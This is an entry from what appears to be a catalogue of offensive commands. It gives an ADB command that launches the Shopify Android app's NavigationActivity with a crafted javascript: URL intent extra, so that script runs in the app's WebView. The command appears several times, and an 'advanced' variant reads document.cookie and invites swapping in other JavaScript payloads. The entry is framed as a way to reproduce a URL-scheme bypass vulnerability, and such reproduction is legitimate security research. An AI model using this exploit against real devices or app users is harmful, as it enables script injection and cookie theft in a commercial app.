---
id: cmd-uuid-001
data: >-
  am start -n
  com.shopify.mobile/com.shopify.mobile.navigation.NavigationActivity --es
  notification_type 2 --es notification_category 1 --es url
  'javascript://shopify.com/admin/articles/%0aalert(1);//'
tags:
  - adb
  - intent
  - exploit
type: command
output: null
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:45.143Z'
verified: false
validated: true
submitted: true
---
# am-start-shopify-navigationactivity-malicious-url

## Command

```bash
am start -n com.shopify.mobile/com.shopify.mobile.navigation.NavigationActivity --es notification_type 2 --es notification_category 1 --es url 'javascript://shopify.com/admin/articles/%0aalert(1);//'
```

## Description

This ADB command starts the NavigationActivity in the Shopify Android app with custom intent extras, injecting a malicious javascript: URL to execute arbitrary JS in the WebView. Use it to reproduce URL scheme bypass vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-n` | Specifies the component name (package/activity) | Yes |
| `--es notification_type 2` | Sets string extra 'notification_type' to '2' for app context | Yes |
| `--es notification_category 1` | Sets string extra 'notification_category' to '1' for simulation | Yes |
| `--es url '...'` | Sets the vulnerable 'url' extra to the javascript payload | Yes |

## Examples

### Basic Usage

```bash
am start -n com.shopify.mobile/com.shopify.mobile.navigation.NavigationActivity --es notification_type 2 --es notification_category 1 --es url 'javascript://shopify.com/admin/articles/%0aalert(1);//'
```

### Advanced Usage

```bash
am start -n com.shopify.mobile/com.shopify.mobile.navigation.NavigationActivity --es notification_type 2 --es notification_category 1 --es url 'javascript:alert(document.cookie);//'
```

Replace payload for different JS actions.

## Expected Output

'Starting: Intent { cmp=com.shopify.mobile/com.shopify.mobile.navigation.NavigationActivity ... }' followed by app launch and in-app alert displaying '1', confirming JS execution in WebView.

## Related

- [[Related Procedure: Launch-NavigationActivity-via-ADB-with-Malicious-URL]]
